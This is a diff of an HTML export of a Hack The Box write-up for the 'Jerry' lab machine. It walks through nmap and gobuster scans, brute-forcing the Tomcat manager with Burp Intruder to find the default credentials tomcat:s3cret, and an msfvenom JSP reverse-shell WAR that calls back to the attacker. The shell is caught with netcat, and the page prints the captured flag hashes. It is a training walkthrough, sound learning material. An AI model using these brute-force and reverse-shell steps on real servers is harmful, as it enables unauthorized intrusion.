@@ -1,34 +1,47 @@
-<!doctype html><html>
+<!DOCTYPE html>
+<html>
 <head>
-  <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <title>jerry</title>
-  <meta name="generator" content="CherryTree">
-  <link rel="stylesheet" href="styles.css" type="text/css" />
+<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
+<title>jerry</title>
+<meta content="CherryTree" name="generator"/>
+<link href="styles.css" rel="stylesheet" type="text/css"/>
 </head>
 <body><div class="main"><div class="tree">
 <p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
-<p><a href="HacktheBox--Windows_Boxes--jerry.html">jerry</a></p>
-
+<p><a href="#jerry">jerry</a></p>
 <ol>
-<li><a href="HacktheBox--Windows_Boxes--jerry--nmap.html">nmap</a></li>
-<li><a href="HacktheBox--Windows_Boxes--jerry--http.html">http</a></li>
+<li><a href="#nmap">nmap</a></li>
+<li><a href="#http">http</a></li>
 <ol>
-<li><a href="HacktheBox--Windows_Boxes--jerry--http--gobuster.html">gobuster</a></li>
-<li><a href="HacktheBox--Windows_Boxes--jerry--http---manager.html">/manager</a></li>
+<li><a href="#gobuster">gobuster</a></li>
+<li><a href="#/manager">/manager</a></li>
 </ol>
-<li><a href="HacktheBox--Windows_Boxes--jerry--passwordspray_Tomcat_server.html">passwordspray Tomcat server</a></li>
+<li><a href="#passwordspray Tomcat server">passwordspray Tomcat server</a></li>
 <ol>
-<li><a href="HacktheBox--Windows_Boxes--jerry--passwordspray_Tomcat_server--default_passwords.html">default passwords</a></li>
-<li><a href="HacktheBox--Windows_Boxes--jerry--passwordspray_Tomcat_server--default_passwords_b64.html">default passwords b64</a></li>
-<li><a href="HacktheBox--Windows_Boxes--jerry--passwordspray_Tomcat_server--Intruder.html">Intruder</a></li>
+<li><a href="#default passwords">default passwords</a></li>
+<li><a href="#default passwords b64">default passwords b64</a></li>
+<li><a href="#Intruder">Intruder</a></li>
 </ol>
-<li><a href="HacktheBox--Windows_Boxes--jerry--initial_foothold.html">initial foothold</a></li>
+<li><a href="#initial foothold">initial foothold</a></li>
 <ol>
-<li><a href="HacktheBox--Windows_Boxes--jerry--initial_foothold--msfvenom_.war_reverse_shell.html">msfvenom .war reverse shell</a></li>
-<li><a href="HacktheBox--Windows_Boxes--jerry--initial_foothold--.war_upload_and_run.html">.war upload and run</a></li>
+<li><a href="#msfvenom .war reverse shell">msfvenom .war reverse shell</a></li>
+<li><a href="#.war upload and run">.war upload and run</a></li>
 </ol>
-<li><a href="HacktheBox--Windows_Boxes--jerry--user-root.html">user/root</a></li>
-<li><a href="HacktheBox--Windows_Boxes--jerry--lessons_learned.html">lessons learned</a></li>
+<li><a href="#user/root">user/root</a></li>
+<li><a href="#lessons learned">lessons learned</a></li>
 </ol></div>
-<div class="page"><h1><b><u>jerry</u></b></h1><img src="images/6-1.png" alt="images/6-1.png" /><br /><img src="images/6-2.png" alt="images/6-2.png" /></div></div>
-</body></html>
+<div class="page" id="jerry"><h1><b><u>jerry</u></b></h1><img alt="images/6-1.png" src="images/6-1.png"/><br/><img alt="images/6-2.png" src="images/6-2.png"/></div>
+<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><span style="color:#ffa500;">nmap -sC -sV -oA nmap/initial 10.10.10.95</span><br/><img alt="images/7-1.png" src="images/7-1.png"/><br/><span style="color:#24ff00;">we have an </span><span style="color:#ffa500;">Apache Tomcat server</span><span style="color:#24ff00;"> running </span><span style="color:#ffa500;">JSP 1.1 </span><span style="color:#24ff00;">on port </span><span style="color:#ffa500;">8080</span></div>
+<div class="page" id="http"><h1><b><u>http</u></b></h1><img alt="images/465-1.png" src="images/465-1.png"/><br/><br/><img alt="images/465-2.png" src="images/465-2.png"/><br/><br/><br/><br/></div>
+<div class="page" id="gobuster"><h1><b><u>gobuster</u></b></h1><span style="color:#24ff00;">running </span><span style="color:#ffa500;">gobuster</span><span style="color:#24ff00;"> on our target </span><br/><br/><span style="color:#ffa500;">gobuster dir -u http://10.10.10.95:8080 -w /usr/share/wordlists/dirbustser/directory-list-2.3-medium.txt</span><br/><img alt="images/486-1.png" src="images/486-1.png"/><br/><span style="color:#ffa500;">/docs<br/>/examples <br/>/shell </span><span style="color:#24ff00;">don't lead to any important findings, <br/><br/>however</span><span style="color:#ffa500;"> /manager</span><span style="color:#24ff00;"> access could allow us </span><span style="color:#ffff00;">remote code execution</span><span style="color:#24ff00;"> on this box</span><br/></div>
+<div class="page" id="/manager"><h1><b><u>/manager</u></b></h1><img alt="images/487-1.png" src="images/487-1.png"/><br/><img alt="images/487-2.png" src="images/487-2.png"/><br/><span style="color:#24ff00;"><br/>and capturing the authentication packet with </span><span style="color:#ffa500;">burpsuite</span><span style="color:#24ff00;"> shows us the server uses </span><span style="color:#ffa500;">basic authorization</span><span style="color:#24ff00;">, which encodes both the username and password in </span><span style="color:#ffa500;">base64</span><br/><img alt="images/487-3.png" src="images/487-3.png"/></div>
+<div class="page" id="passwordspray Tomcat server"><h1><b><u>passwordspray Tomcat server</u></b></h1><span style="color:#ffa500;">default passwords<br/>default passwords base 64<br/>Intruder</span></div>
+<div class="page" id="default passwords"><h1><b><u>default passwords</u></b></h1><span style="color:#24ff00;">lets search for default usernames and passwords on google and either copy or make our own list to try and bruteforce authentication to the tomcat server manager page</span><br/><img alt="images/41-1.png" src="images/41-1.png"/><br/><img alt="images/41-2.png" src="images/41-2.png"/><br/><img alt="images/41-3.png" src="images/41-3.png"/><br/><br/><span style="color:#24ff00;">Tomcat server default password list:</span><br/><img alt="images/41-4.png" src="images/41-4.png"/></div>
+<div class="page" id="default passwords b64"><h1><b><u>default passwords b64</u></b></h1><span style="color:#24ff00;">now that we have our username and password list, </span>we <br/><br/><img alt="images/42-1.png" src="images/42-1.png"/><br/><img alt="images/42-2.png" src="images/42-2.png"/></div>
+<div class="page" id="Intruder"><h1><b><u>Intruder</u></b></h1><img alt="images/43-1.png" src="images/43-1.png"/><br/><img alt="images/43-2.png" src="images/43-2.png"/><br/><img alt="images/43-3.png" src="images/43-3.png"/><br/><img alt="images/43-4.png" src="images/43-4.png"/><br/><span style="color:#24ff00;">intruder shows that the</span> <span style="color:#ffff00;">dG9tY2F0OnMzY3JldA==</span> <span style="color:#24ff00;">returns a status code server response </span><span style="color:#ffa500;">200</span><span style="color:#24ff00;"> and response length of </span><span style="color:#ffa500;">19248 bytes</span><span style="color:#24ff00;">, because it is an outlier to the rest of intruder's password attempts, it is safe to assume we have ourselves a successful login!</span><br/><br/><img alt="images/43-5.png" src="images/43-5.png"/><br/><span style="color:#24ff00;">we can use burpsuite's built in base64 decoder on the string to reveal our username and password are </span><br/><span style="color:#ffff00;">tomcat</span><span style="color:#24ff00;">:</span><span style="color:#ffff00;">s3cret</span><br/><br/><br/><span style="color:#ffff00;">Note: </span><span style="color:#24ff00;">Only use </span><span style="color:#ffa500;">Intuder</span><span style="color:#24ff00;"> for small user/password payloads unless you have the professional edition of burp suite, it runs very </span><span style="color:#ff0000;">slow</span><span style="color:#24ff00;"> in comparison to other freeware webapp bruteforcers such as </span><span style="color:#ffa500;">hydra</span></div>
+<div class="page" id="initial foothold"><h1><b><u>initial foothold</u></b></h1><span style="color:#24ff00;">using username </span><span style="color:#ffff00;">tomcat</span><span style="color:#24ff00;"> password </span><span style="color:#ffff00;">s3cret</span><span style="color:#24ff00;"> on the manager login form</span><br/><img alt="images/1047-1.png" src="images/1047-1.png"/><br/><br/><span style="color:#24ff00;">logs us into the</span><span style="color:#ffff00;"> Tomcat Web Application Manager</span><span style="color:#24ff00;">!</span><br/><img alt="images/1047-2.png" src="images/1047-2.png"/><br/><img alt="images/1047-3.png" src="images/1047-3.png"/><br/><img alt="images/1047-4.png" src="images/1047-4.png"/><br/><img alt="images/1047-5.png" src="images/1047-5.png"/><br/><img alt="images/1047-6.png" src="images/1047-6.png"/></div>
+<div class="page" id="msfvenom .war reverse shell"><h1><b><u>msfvenom .war reverse shell</u></b></h1><span style="color:#24ff00;">on </span><span style="color:#ffff00;">manager page</span><span style="color:#24ff00;"> after login there is an upload feature on the webserver that allows .war uploads<br/></span><img alt="images/1049-1.png" src="images/1049-1.png"/><br/><span style="color:#ffff00;">Note: </span><span style="color:#24ff00;">make sure its a </span><span style="color:#ffa500;">java/jsp_reverse_tcp</span><span style="color:#24ff00;"> payload for war files</span> <span style="color:#24ff00;">because tomcat servers are run </span><span style="color:#ffa500;">.war</span><span style="color:#24ff00;"> files that run </span><span style="color:#ffa500;">java</span><span style="color:#24ff00;"> payloads</span><br/><br/><span style="color:#24ff00;">we're going to use </span><span style="color:#ffa500;">msfvenom</span><span style="color:#24ff00;"> to generate a </span><span style="color:#ffff00;">reverse shell payload</span><span style="color:#24ff00;"> written in </span><span style="color:#ffa500;">.war</span><span style="color:#24ff00;">, find payloads to this and more</span> <a href="https://netsec.ws/?p=331">here</a><br/><img alt="images/1049-2.png" src="images/1049-2.png"/><br/><img alt="images/1049-3.png" src="images/1049-3.png"/><br/><br/><span style="color:#ffa500;">msfvenom -p java/jsp_shell_reverse_tcp -f war LHOST=10.10.14.62 LPORT=9876 -o newshell.war</span><br/><img alt="images/1049-4.png" src="images/1049-4.png"/><br/><br/></div>
+<div class="page" id=".war upload and run"><h1><b><u>.war upload and run</u></b></h1><img alt="images/44-1.png" src="images/44-1.png"/><span style="color:#24ff00;"><br/><br/>clicking the newly generated </span><span style="color:#ffa500;">shell2</span><span style="color:#24ff00;"> link or navigating to its location in our browser will both execute our </span><span style="color:#ffa500;">.war </span><span style="color:#24ff00;">payload and send a reverse shell back to our machine!<br/></span><img alt="images/44-2.png" src="images/44-2.png"/><br/><span style="color:#ffa500;">nc -nlvp 9876</span><br/><img alt="images/44-3.png" src="images/44-3.png"/><br/><span style="color:#24ff00;">and we're </span><span style="color:#ffff00;">system</span><span style="color:#24ff00;">!<br/><br/></span></div>
+<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/489-1.png" src="images/489-1.png"/><br/><span style="color:#ffff00;">7004dbcef0f854e0fb401875f26ebd00<br/>04a8b36e1545a455393d067e772fe90e</span></div>
+<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><img alt="images/1050-1.png" src="images/1050-1.png"/></div>
+</div></body></html>
